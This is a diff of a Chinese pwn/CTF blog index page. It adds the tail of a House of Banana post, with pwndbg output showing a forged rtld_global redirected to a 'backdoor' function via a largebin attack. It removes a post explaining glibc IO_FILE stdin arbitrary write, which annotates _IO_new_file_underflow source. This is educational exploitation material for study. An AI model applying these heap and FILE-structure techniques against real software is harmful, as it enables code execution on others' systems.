class="number">0x800000000</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这种类型的 House Of Banana 直接攻击“rtld_global”，利用 largebin attack 在“rtld_global”中写入“fake_rtld_global_addr”（“fake_rtld_global” - 0x10）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;_rtld_global</span><br><span class="line">$<span class="number">5</span> = (struct rtld_global *) <span class="number">0x7ffff7ffd060</span> &lt;_rtld_global&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/xg <span class="number">0x7ffff7ffd060</span></span><br><span class="line"><span class="number">0x7ffff7ffd060</span> &lt;_rtld_global&gt;:	<span class="number">0x000055555555ab20</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p fake_rtld_global</span><br><span class="line">$<span class="number">10</span> = (<span class="keyword">size_t</span> *) <span class="number">0x55555555ab30</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;fake_rtld_global_addr</span><br><span class="line">$<span class="number">12</span> = (<span class="keyword">size_t</span> *) <span class="number">0x7fffffffde20</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x000055555555ab20</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55555555ab20</span> —▸ <span class="number">0x55555555acc0</span> —▸ <span class="number">0x5555555551f9</span> (backdoor) ◂— endbr64 </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55555555ab28</span> ◂— <span class="number">0x451</span> </span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55555555ab30</span> —▸ <span class="number">0x7ffff7fc1fe0</span> (main_arena+<span class="number">1120</span>) —▸ <span class="number">0x7ffff7fc1fd0</span> (main_arena+<span class="number">1104</span>) —▸ <span class="number">0x7ffff7fc1fc0</span> (main_arena+<span class="number">1088</span>) —▸ <span class="number">0x7ffff7fc1fb0</span> (main_arena+<span class="number">1072</span>) ◂— ...</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55555555ab38</span> —▸ <span class="number">0x55555555ab40</span> —▸ <span class="number">0x55555555a6a0</span> ◂— <span class="number">0x0</span> </span><br><span class="line">    <span class="comment">/* fake_rtld_global[1] */</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55555555ab40</span> —▸ <span class="number">0x55555555a6a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">    <span class="comment">/* fake_rtld_global[2] */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x55555555ab48</span> —▸ <span class="number">0x55555555ab20</span> —▸ <span class="number">0x55555555acc0</span> —▸ <span class="number">0x5555555551f9</span> (backdoor) ◂— endbr64 </span><br><span class="line">    <span class="comment">/* fake_rtld_global[3] */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x55555555ab50</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x55555555ab58</span> —▸ <span class="number">0x55555555ab48</span> —▸ <span class="number">0x55555555ab20</span> —▸ <span class="number">0x55555555acc0</span> —▸ <span class="number">0x5555555551f9</span> (backdoor) </span><br></pre></td></tr></table></figure>
+<p>利用条件：</p>
+<ul>
+<li>有足够的空间，可以伪造“rtld_global”结构体</li>
+<li>可以使用 Largebin attack</li>
+</ul>
+<h2 id="版本对-House-Of-Banana-的影响"><a href="#版本对-House-Of-Banana-的影响" class="headerlink" title="版本对 House Of Banana 的影响"></a>版本对 House Of Banana 的影响</h2><p>目前为止没有影响</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/09/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E8%B1%A1%E8%BF%98%E5%8E%9F/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2343,151 +2460,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/02/IO_FILE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9Astdin%E4%BB%BB%E6%84%8F%E5%86%99/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/02/IO_FILE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%EF%BC%9Astdin%E4%BB%BB%E6%84%8F%E5%86%99/" class="post-title-link" itemprop="url">IO_FILE源码分析：stdin任意写</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-04-02 01:49:41" itemprop="dateCreated datePublished" datetime="2022-04-02T01:49:41+08:00">2022-04-02</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-04-03 17:26:07" itemprop="dateModified" datetime="2022-04-03T17:26:07+08:00">2022-04-03</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/SourceCodeAnalysis/" itemprop="url" rel="index"><span itemprop="name">SourceCodeAnalysis</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>3.2k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>3 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="IO-FILE源码分析：stdin任意写"><a href="#IO-FILE源码分析：stdin任意写" class="headerlink" title="IO_FILE源码分析：stdin任意写"></a>IO_FILE源码分析：stdin任意写</h2><p>如果能过伪造这些缓冲区指针，在一定的条件下应该可以完成任意地址的读写</p>
-<p>接下来描述这两部分的原理以及给出相应的题目实践，原理介绍部分是基于已经拥有可以伪造IO FILE结构体的缓冲区指针漏洞的基础上进行的，在后续过程假设我们目标写的地址是<code>write_start</code>，写结束地址为<code>write_end</code>，读的目标地址为<code>read_start</code>，读的结束地址为<code>read_end</code></p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>字段名称</th>
-<th>中文描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>_IO_buf_base</td>
-<td>输入输出缓冲区基地址</td>
-</tr>
-<tr>
-<td>_IO_buf_end</td>
-<td>输入输出缓冲区结束地址</td>
-</tr>
-<tr>
-<td>_IO_write_base</td>
-<td>输出缓冲区基地址</td>
-</tr>
-<tr>
-<td>_IO_write_ptr</td>
-<td>输出缓冲区已使用的地址</td>
-</tr>
-<tr>
-<td>_IO_write_end</td>
-<td>输出缓冲区结束地址</td>
-</tr>
-</tbody>
-</table>
-</div>
-<p>简述 fread 的执行过程：</p>
-<ul>
-<li>第一部分是 <code>fp-&gt;_IO_buf_base</code> 为空的情况，表明此时的FILE结构体中的指针未被初始化，输入缓冲区未建立，则调用 <code>_IO_doallocbuf</code> 去初始化指针，建立输入缓冲区</li>
-<li>第二部分是输入缓冲区里有输入并且够用，此时将缓冲区里的数据直接拷贝至目标buff</li>
-<li>第三部分是输入缓冲区里的数据为空或者是不能满足全部的需求，则调用 <code>__underflow</code> 调用系统调用读入数据到缓冲区，然后再把数据从缓冲区中复制给用户</li>
-</ul>
-<p>假设我们能过控制输入缓冲区指针，使得输入缓冲区指向想要写的地址，那么在第三步调用系统调用读取数据到输入缓冲区的时候，也就会调用系统调用读取数据到我们想要写的地址，从而实现任意地址写的目的</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> _IO_new_file_underflow _IO_file_underflow</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_file_underflow (fp)</span><br><span class="line">     _IO_FILE *fp;</span><br><span class="line">&#123;</span><br><span class="line">  _IO_ssize_t count;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="comment">/* SysV does not make this test; take it out for compatibility */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN) <span class="comment">/* _flag标志位是否包含_IO_NO_READS */</span></span><br><span class="line">    <span class="keyword">return</span> (EOF);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>) <span class="comment">/* 调用_IO_doallocbuf分配输入缓冲区 */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush all line buffered files before reading. */</span></span><br><span class="line">  <span class="comment">/* FIXME This can/should be moved to genops ?? */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))</span><br><span class="line">    _IO_flush_all_linebuffered ();</span><br><span class="line"></span><br><span class="line">  _IO_switch_to_get_mode (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化设置FILE结构体指针，将他们都设置成fp-&gt;_IO_buf_base */</span></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">		       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br><span class="line">    <span class="comment">/* _IO_SYSREAD == vtable-&gt;_IO_file_read,程序最终会调用read */</span></span><br><span class="line">    <span class="comment">/* 执行read读取数据到fp-&gt;_IO_buf_base,读入大小为输入缓冲区的大小 */</span></span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">	fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fp-&gt;_IO_read_end += count; <span class="comment">/* 更新输入缓冲区的大小 */</span></span><br><span class="line">  <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">  <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>将上述条件综合表述为：</p>
-<ul>
-<li>设置 <code>_IO_read_end</code> 等于 <code>_IO_read_ptr</code></li>
-<li>设置 <code>_flag &amp;~ _IO_NO_READS</code> 即 <code>_flag &amp;~ 0x4</code></li>
-<li>设置 <code>_fileno</code> 为 0</li>
-<li>设置 <code>_IO_buf_base</code> 为 <code>write_start</code> ， <code>_IO_buf_end</code> 为 <code>write_end</code> 且使得 <code>_IO_buf_end-_IO_buf_base</code> 大于fread要读的数据</li>
-</ul>
-<p>stdin 任意写漏洞的关键就是这几步：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end) <span class="comment">/* 利用的前提 */</span></span><br><span class="line">    <span class="keyword">return</span> *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">........</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;</span><br><span class="line">  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end</span><br><span class="line">    = fp-&gt;_IO_buf_base;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,</span><br><span class="line">		       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);</span><br></pre></td></tr></table></figure>
-<ul>
-<li>当 <code>_IO_read_ptr</code> &gt;= <code>_IO_read_end</code> 时，程序就会执行系统调用</li>
-<li>然后各种指针都会被更新为 <code>_IO_buf_base</code> </li>
-<li>最后执行系统调用向 <code>_IO_buf_base</code> 缓冲区输入数据</li>
-</ul>
-<p>stdin 任意写漏洞，其实就是通过改写 <code>_IO_buf_base</code> 来控制缓冲区的位置，进而控制键盘输入数据的位置（键盘输入的数据先放入缓冲区，再复制到目标位置）</p>
-<p>通常程序不能直接在 <code>_IO_buf_base</code> 中写入数据（如果可以直接写入，那不就可以打hook了吗），而是可以对其进行覆盖，小幅度调节它的位置，然后利用新读入的数据去覆盖 <code>_IO_buf_end</code> 等其他字段，进而控制程序</p>
-<hr>
-<p>讲起来有点抽象，其实我看 raycp 师傅的博客时就不是很明白，但去把博客上附带的那道例题复现了之后就清晰了不少</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2559,7 +2531,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">243</span>
+          <span class="site-state-item-count">244</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -2613,7 +2585,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">49:30</span>
+    <span title="Reading time total">49:38</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
